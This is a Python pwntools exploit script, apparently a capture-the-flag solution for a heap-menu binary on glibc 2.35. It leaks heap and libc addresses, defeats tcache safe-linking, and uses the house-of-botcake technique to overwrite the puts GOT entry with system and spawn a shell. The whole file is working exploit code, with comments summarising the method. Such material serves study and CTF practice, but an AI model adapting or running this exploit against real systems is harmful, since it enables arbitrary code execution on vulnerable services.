#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.35.so')
if args.LOCAL:
    p = elf.process()
    if args.GDB: 
        context.update(binary=elf, log_level='DEBUG')
        # gdb.attach(p, '''
        #     b *main+131
        #     b *main+143
        #     b *main+155
        # ''')
else:
    p = remote("", "")


def op_malloc(index, size, content):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(index).encode())
    p.sendlineafter(b"> ", str(int(size)).encode())
    p.sendlineafter(b"content: ", content)
    return 

def op_free(index):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(index).encode())
    return 

def op_view(index):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(index).encode())
    leak = p.recv(6).strip()
    return leak

# leak heap 
op_malloc(0, 0x100, b"A"*8)
op_free(0)
leak = op_view(0)
key = u64(leak.ljust(8, b"\x00")) 
heap_base = key << 12
log.info("Heap base address: " + hex(heap_base))

# leak libc
for i in range(7):
    op_malloc(i, 0x100, b"A"*8)

op_malloc(7, 0x100, b"B"*8)
op_malloc(8, 0x100, b"C"*8)
op_malloc(9, 0x10, b"/bin/sh\x00")

for i in range(7):
    op_free(i)

op_free(8)
op_free(7)
op_malloc(6, 0x100, b"E" * 8) # pop 6 out t-cache, slot for 8
op_free(8) # put victim 8 in t-cache
leak = op_view(7).ljust(8, b"\x00")
libc.address = u64(leak) - 0x219ce0
abs_got_puts = libc.address + 0x219098
log.info("LIBC base address:   " + hex(libc.address))
log.info("system address:      " + hex(libc.symbols['system']))
log.info("ABS_GOT_PUTS:        " + hex(abs_got_puts))
# house-of-botcake           
# 0x7f1b1219e297 <malloc+375>    test   al, 0xf
# 0x7f1b1219e299 <malloc+377>    jne    malloc+816                <malloc+816>
# ↓
# 0x7f1b1219e450 <malloc+816>    lea    rdi, [rip + 0x1398e9]
# ► 0x7f1b1219e457 <malloc+823>    call   malloc_printerr                <malloc_printerr>
payload = b"A" * 0x108 + p64(0x111) + p64(key ^ (abs_got_puts - 8)) # align 8
# malloc size greater 0x110 => overwrite fd of t-cache
op_malloc(1, 0x120, payload) 
op_malloc(2, 0x100, b"A"*8)
op_malloc(3, 0x100, b"A"*8 + p64(libc.symbols['system']))
op_view(9)

p.interactive()


# Leak heap address + defeating safe linking by printing the first free’d chunk in the tcache.
# House of botcake to op_malloc overlapping chunks and get arbitrary write
# FSOP on stdout to leak environ and then ROP over the stack.